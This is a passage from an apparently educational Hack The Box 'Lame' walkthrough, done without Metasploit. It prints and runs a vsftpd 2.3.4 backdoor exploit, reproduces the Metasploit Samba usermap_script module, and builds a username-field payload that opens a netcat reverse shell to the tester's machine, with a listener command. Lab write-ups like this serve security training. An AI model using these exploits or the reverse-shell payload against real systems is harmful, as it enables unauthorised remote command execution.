+</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span>
+</span></span><span class="line"><span class="cl"><span class="n">portFTP</span> <span class="o">=</span> <span class="mi">21</span> <span class="c1">#if necessary edit this line</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">user</span><span class="o">=</span><span class="s2">&#34;USER nergal:)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span><span class="o">=</span><span class="s2">&#34;PASS pass&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">=</span><span class="n">Telnet</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">portFTP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;(vsFTPd 2.3.4)&#34;</span><span class="p">)</span> <span class="c1">#if necessary, edit this line</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;password.&#34;</span><span class="p">)</span> <span class="c1">#if necessary, edit this line</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tn2</span><span class="o">=</span><span class="n">Telnet</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">6200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Success, shell opened&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Send `exit` to quit shell&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn2</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It appears that in this version of vsftpd, including a &ldquo;:)&rdquo; in the username opens a backdoor on port 6200 in the form of a bind shell port. The exploit connects to the vsftpd service with telnet, submits a username including &ldquo;:)&rdquo;, and then checks if port 6200 has been opened. Let&rsquo;s try running the exploit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~
+</span></span><span class="line"><span class="cl">python3 49757.py 10.10.10.3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/python-exploit.png"
+	width="265"
+	height="56"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/python-exploit_hu0b997c25e558af41935e26e1f2975fc6_7170_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/python-exploit_hu0b997c25e558af41935e26e1f2975fc6_7170_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Python FTP exploit"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="473"
+		data-flex-basis="1135px"
+	
+><br>
+When we run the exploit, it hangs.  Let&rsquo;s add print statements to see where it is reaching.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Date: 9-04-2021</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: HerculesRD</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Version: vsftpd 2.3.4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: debian</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE : CVE-2011-2523</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">telnetlib</span> <span class="kn">import</span> <span class="n">Telnet</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">signal</span> <span class="kn">import</span> <span class="n">signal</span><span class="p">,</span> <span class="n">SIGINT</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">signal_received</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Handle any cleanup here</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;   [+]Exiting...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">=</span><span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;input the address of the vulnerable host&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span>
+</span></span><span class="line"><span class="cl"><span class="n">portFTP</span> <span class="o">=</span> <span class="mi">21</span> <span class="c1">#if necessary edit this line</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">user</span><span class="o">=</span><span class="s2">&#34;USER nergal:)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span><span class="o">=</span><span class="s2">&#34;PASS pass&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Sending user/pass to vsftpd w/ telnet...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">=</span><span class="n">Telnet</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">portFTP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;(vsFTPd 2.3.4)&#34;</span><span class="p">)</span> <span class="c1">#if necessary, edit this line</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;password.&#34;</span><span class="p">)</span> <span class="c1">#if necessary, edit this line</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Sent. Checking if port 6200 is open...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn2</span><span class="o">=</span><span class="n">Telnet</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">6200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Success, shell opened&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Send `exit` to quit shell&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tn2</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With these additonal prints, let&rsquo;s run the exploit again.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~
+</span></span><span class="line"><span class="cl">python3 49757.py 10.10.10.3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/python-exploit-dbg.png"
+	width="340"
+	height="90"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/python-exploit-dbg_hud97353de91bacc418ea98812f04469b7_10789_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/python-exploit-dbg_hud97353de91bacc418ea98812f04469b7_10789_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Pyhton FTP exploit w/ debug prints"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="377"
+		data-flex-basis="906px"
+	
+><br>
+Now we can see that it is hanging when checking for the backdoor port. It looks like this exploit will not be our foothold. Time to try the next item on our list.</p>
+<h3 id="samba-3020---username-map-script-command-execution">samba 3.0.20 - &lsquo;Username&rsquo; map script&rsquo; Command Execution</h3>
+<p>Again, I am avoiding the use of Metasploit for OSCP preparation so even though the samba exploit we found is a Metasploit module, let&rsquo;s check it out by hand.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1">##</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Framework web site for more information on licensing and terms of use.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># http://metasploit.com/framework/</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+</span></span><span class="line"><span class="cl">        <span class="no">Rank</span> <span class="o">=</span> <span class="no">ExcellentRanking</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">SMB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># For our customized version of session_setup_ntlmv1</span>
+</span></span><span class="line"><span class="cl">        <span class="no">CONST</span> <span class="o">=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Proto</span><span class="o">::</span><span class="no">SMB</span><span class="o">::</span><span class="no">Constants</span>
+</span></span><span class="line"><span class="cl">        <span class="no">CRYPT</span> <span class="o">=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Proto</span><span class="o">::</span><span class="no">SMB</span><span class="o">::</span><span class="no">Crypt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="cl">                <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;Samba &#34;username map script&#34; Command Execution&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                        This module exploits a command execution vulerability in Samba
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                versions 3.0.20 through 3.0.25rc3 when using the non-default
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                &#34;username map script&#34; configuration option. By specifying a username
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                containing shell meta characters, attackers can execute arbitrary
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                commands.
+</span></span></span><span class="line"><span class="cl"><span class="sx">
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                No authentication is needed to exploit this vulnerability since
+</span></span></span><span class="line"><span class="cl"><span class="sx">                                this option is used to map usernames prior to authentication!
+</span></span></span><span class="line"><span class="cl"><span class="sx">                        }</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;jduck&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Version&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;$Revision: 10040 $&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;References&#39;</span>     <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">[</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">[</span> <span class="s1">&#39;CVE&#39;</span><span class="p">,</span> <span class="s1">&#39;2007-2447&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">[</span> <span class="s1">&#39;OSVDB&#39;</span><span class="p">,</span> <span class="s1">&#39;34700&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">[</span> <span class="s1">&#39;BID&#39;</span><span class="p">,</span> <span class="s1">&#39;23972&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://samba.org/samba/security/CVE-2007-2447.html&#39;</span> <span class="o">]</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span><span class="s1">&#39;unix&#39;</span><span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH_CMD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span> <span class="c1"># root or nobody user</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Payload&#39;</span>        <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                        <span class="s1">&#39;Space&#39;</span>    <span class="o">=&gt;</span> <span class="mi">1024</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                        <span class="s1">&#39;DisableNops&#39;</span> <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                        <span class="s1">&#39;Compat&#39;</span>      <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">                                                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="s1">&#39;PayloadType&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;cmd&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="c1"># *_perl and *_ruby work if they are installed</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="c1"># mileage may vary from system to system..</span>
+</span></span><span class="line"><span class="cl">                                                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">[</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">[</span> <span class="s2">&#34;Automatic&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span> <span class="o">]</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;DisclosureDate&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;May 14 2007&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">register_options</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">[</span>
+</span></span><span class="line"><span class="cl">                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">139</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">exploit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">connect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1"># lol?</span>
+</span></span><span class="line"><span class="cl">                <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;/=`nohup &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="s2">&#34;`&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">begin</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">simple</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">negotiate</span><span class="p">(</span><span class="kp">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">simple</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">session_setup_ntlmv1</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">rand_text</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;SMBDomain&#39;</span><span class="o">]</span><span class="p">,</span> <span class="kp">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">rescue</span> <span class="o">::</span><span class="no">Timeout</span><span class="o">::</span><span class="no">Error</span><span class="p">,</span> <span class="no">XCEPT</span><span class="o">::</span><span class="no">LoginError</span>
+</span></span><span class="line"><span class="cl">                        <span class="c1"># nothing, it either worked or it didn&#39;t ;)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">handler</span>
+</span></span><span class="line"><span class="cl">        <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">end</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We only need to take a look at the exploit section:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">connect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1"># lol?</span>
+</span></span><span class="line"><span class="cl">                <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;/=`nohup &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="s2">&#34;`&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">begin</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">simple</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">negotiate</span><span class="p">(</span><span class="kp">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">simple</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">session_setup_ntlmv1</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">rand_text</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;SMBDomain&#39;</span><span class="o">]</span><span class="p">,</span> <span class="kp">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">rescue</span> <span class="o">::</span><span class="no">Timeout</span><span class="o">::</span><span class="no">Error</span><span class="p">,</span> <span class="no">XCEPT</span><span class="o">::</span><span class="no">LoginError</span>
+</span></span><span class="line"><span class="cl">                        <span class="c1"># nothing, it either worked or it didn&#39;t ;)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">handler</span>
+</span></span><span class="line"><span class="cl">        <span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that the exploit is sending a reverse shell in the username field! Should be easy enough. First let&rsquo;s craft our payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;/=`nohup nc -e /bin/bash 10.10.14.3 1337`&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>My Kali IP is 10.10.14.3 and I&rsquo;m starting my listener on port 1337.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">1337</span>  
+</span></span></code></pre></td></tr></table>
+</div>
